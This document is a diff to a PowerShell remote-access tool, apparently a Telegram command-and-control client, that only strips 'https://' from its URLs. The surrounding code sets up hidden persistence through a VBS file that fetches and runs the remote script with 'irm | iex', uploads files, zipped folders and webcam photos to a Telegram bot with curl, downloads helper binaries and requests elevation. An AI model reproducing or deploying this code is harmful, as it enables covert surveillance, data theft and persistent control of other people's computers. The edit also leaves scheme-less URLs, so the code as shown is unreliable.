@@ -5,9 +5,9 @@ $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername
 $global:errormsg = 0 # 1 = return error messages to chat (off by default)
 $HideWindow = 0 # HIDE THE WINDOW - Change to 1 to hide the console window
 $version = "1.7.1" # Current Version
-$parent = "https://raw.githubusercontent.com/poshgram/poshgram/refs/heads/main/TelegramC2-Client.ps1" # parent script URL (for restarts and persistance)
-$apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
-$URL = 'https://api.telegram.org/bot{0}' -f $Token
+$parent = "raw.githubusercontent.com/poshgram/poshgram/refs/heads/main/TelegramC2-Client.ps1" # parent script URL (for restarts and persistance)
+$apiUrl = "api.telegram.org/bot$Token/sendMessage"
+$URL = 'api.telegram.org/bot{0}' -f $Token
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
@@ -30,7 +30,7 @@ $hwnd = (Get-Process -PID $pid).MainWindowHandle
 
 # Check version and update
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
-$versionCheck = irm -Uri "https://pastebin.com/raw/53qHJkJC"
+$versionCheck = irm -Uri "pastebin.com/raw/53qHJkJC"
 $VBpath = "C:\Windows\Tasks\service.vbs"
 if (Test-Path $newScriptPath){
 Write-Output "Persistance Installed - Checking Version.."
@@ -41,7 +41,7 @@ Write-Output "Persistance Installed - Checking Version.."
         $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/poshgram/poshgram/refs/heads/main/TelegramC2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm raw.githubusercontent.com/poshgram/poshgram/refs/heads/main/TelegramC2-Client.ps1 | iex`", 0, True
 "@
         $tobat | Out-File -FilePath $VBpath -Force
         sleep 1
@@ -166,11 +166,11 @@ if (Test-Path -Path $path){
         $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
-        curl.exe -F chat_id="$ChatID" -F document=@"$tempZipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+        curl.exe -F chat_id="$ChatID" -F document=@"$tempZipFilePath" "api.telegram.org/bot$Token/sendDocument" | Out-Null
         Write-Output "File Upload Complete: $path"
         Rm -Path $tempZipFilePath -Recurse -Force
     }else{
-        curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+        curl.exe -F chat_id="$ChatID" -F document=@"$Path" "api.telegram.org/bot$Token/sendDocument" | Out-Null
         Write-Output "File Upload Complete: $path"
     }
 }else{Write-Host "File Not Found: $path"}
@@ -395,7 +395,7 @@ While ($true){
         $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
 WScript.Sleep 200
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/poshgram/poshgram/refs/heads/main/TelegramC2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm raw.githubusercontent.com/poshgram/poshgram/refs/heads/main/TelegramC2-Client.ps1 | iex`", 0, True
 "@
         $pth = "C:\Windows\Tasks\service.vbs"
         $tobat | Out-File -FilePath $pth -Force
@@ -732,7 +732,7 @@ $Computers | Export-Csv $FileOut -NoTypeInformation
 $data = Import-Csv $FileOut
 $data | ForEach-Object {
     $mac = $_.'MAC'
-    $apiUrl = "https://api.macvendors.com/$mac"
+    $apiUrl = "api.macvendors.com/$mac"
     $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
     Start-Sleep -Seconds 1
     $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
@@ -819,7 +819,7 @@ If Not WScript.Arguments.Named.Exists(`"elevate`") Then
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
   WScript.Quit
 End If
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/poshgram/poshgram/refs/heads/main/TelegramC2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm raw.githubusercontent.com/poshgram/poshgram/refs/heads/main/TelegramC2-Client.ps1 | iex`", 0, True
 "@
 $pth = "C:\Windows\Tasks\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
@@ -852,7 +852,7 @@ Function Message([string]$Message){
 Function Take-Picture {
 $dllPath = Join-Path -Path $env:TEMP -ChildPath "webcam.dll"
 if (-not (Test-Path $dllPath)) {
-    $url = "https://github.com/beigeworm/assets/raw/main/webcam.dll"
+    $url = "github.com/beigeworm/assets/raw/main/webcam.dll"
     $webClient = New-Object System.Net.WebClient
     $webClient.DownloadFile($url, $dllPath)
 }
@@ -864,7 +864,7 @@ $tempDir = [System.IO.Path]::GetTempPath()
 $imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
 [System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
     sleep 1
-    curl.exe -F chat_id="$ChatID" -F document=@"$imagePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+    curl.exe -F chat_id="$ChatID" -F document=@"$imagePath" "api.telegram.org/bot$Token/sendDocument" | Out-Null
     sleep 1
     Remove-Item -Path "$env:TEMP\webcam.dll"
     Remove-Item -Path $imagePath -Force
@@ -903,7 +903,7 @@ Post-Message | Out-Null
 $Path = "$env:Temp\ffmpeg.exe"
     If (!(Test-Path $Path)){  
         $tempDir = "$env:temp"
-        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
+        $apiUrl = "api.github.com/repos/GyanD/codexffmpeg/releases/latest"
         $response = Invoke-WebRequest -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" } -UseBasicParsing
         $release = $response.Content | ConvertFrom-Json
         $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
@@ -926,7 +926,7 @@ $Path = "$env:Temp\ffmpeg.exe"
 
 # Posting Functions
 Function Post-Message{$script:params = @{chat_id = $ChatID ;text = $contents};Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params}
-Function Post-File{curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null}
+Function Post-File{curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "api.telegram.org/bot$Token/sendDocument" | Out-Null}
 
 Function ShowButtons{
 $messagehead = "Press a Button to Continue..."
@@ -936,7 +936,7 @@ Invoke-RestMethod -Uri $apiUrl -Method POST -ContentType "application/json" -Bod
 $killint = 0
 $offset = 0
 while ($killint -eq 0) {
-    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
+    $updates = Invoke-RestMethod -Uri "api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
     foreach ($update in $updates.result) {
         $offset = $update.update_id + 1
         Sleep 1
